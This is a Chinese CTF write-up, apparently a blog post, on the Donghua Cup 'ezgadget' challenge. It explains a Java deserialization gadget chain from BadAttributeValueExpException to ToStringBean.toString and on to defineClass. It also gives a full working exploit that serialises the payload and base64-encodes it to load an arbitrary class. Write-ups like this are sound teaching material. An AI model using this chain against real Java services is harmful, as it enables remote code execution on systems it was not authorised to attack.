---
layout: post
title: 东华杯ezgadgetJava反序列化
tags: Java
---

# 分析

题目是一个jar包

其中`ToStringBean`类下调用了defineclass和newInstance方法.跟之前的CC3一样造成任意代码执行

![image-20240927201628256](\images\posts\东华杯ezgadgetJava反序列化\image-20240927201628256.png)

而在之前的CC5中`BadAttributeValueExpException`调用了`toString`方法

![image-20240927202653895](\images\posts\东华杯ezgadgetJava反序列化\image-20240927202653895.png)

所以链子为`BadAttributeValueExpException`->`toString`

# 编写EXP

先通过反射修改`ClassByte`的值

```Java
    ToStringBean toStringBean = new ToStringBean();
    Field declaredField = toStringBean.getClass().getDeclaredField("ClassByte");
    declaredField.setAccessible(true);

    byte[] bytes = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
    declaredField.set(toStringBean,bytes);
```

再用`BadAttributeValueExpException`来调用`toString`

这里是调用`toString`后将结果赋值给了val,然后`readObject`调用val的`toString`.所以这里随便传一个值在后面在反射修改回来

```Java
    BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(113);//随便传

    Field declaredField1 = badAttributeValueExpException.getClass().getDeclaredField("val");
    declaredField1.setAccessible(true);
    declaredField1.set(badAttributeValueExpException,toStringBean);
```

`IndexController`里面的if判断

```
if (name.equals("gadgets") && year == 2021) {
    objectInputStream.readObject();
}
```

所以最后的EXP为

```Java
package com.ezgame.ctf.tools;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class EXP {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException {
        ToStringBean toStringBean = new ToStringBean();
        Field declaredField = toStringBean.getClass().getDeclaredField("ClassByte");
        declaredField.setAccessible(true);

        byte[] bytes = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        declaredField.set(toStringBean, bytes);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(113);//随便传

        Field declaredField1 = badAttributeValueExpException.getClass().getDeclaredField("val");
        declaredField1.setAccessible(true);
        declaredField1.set(badAttributeValueExpException, toStringBean);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeUTF("gadgets");
        objectOutputStream.writeInt(2021);
        objectOutputStream.writeObject(badAttributeValueExpException);

        byte[] byteArray = byteArrayOutputStream.toByteArray();
        String bytes1 = Tools.base64Encode(byteArray);
        System.out.println(bytes1);
    }

}
```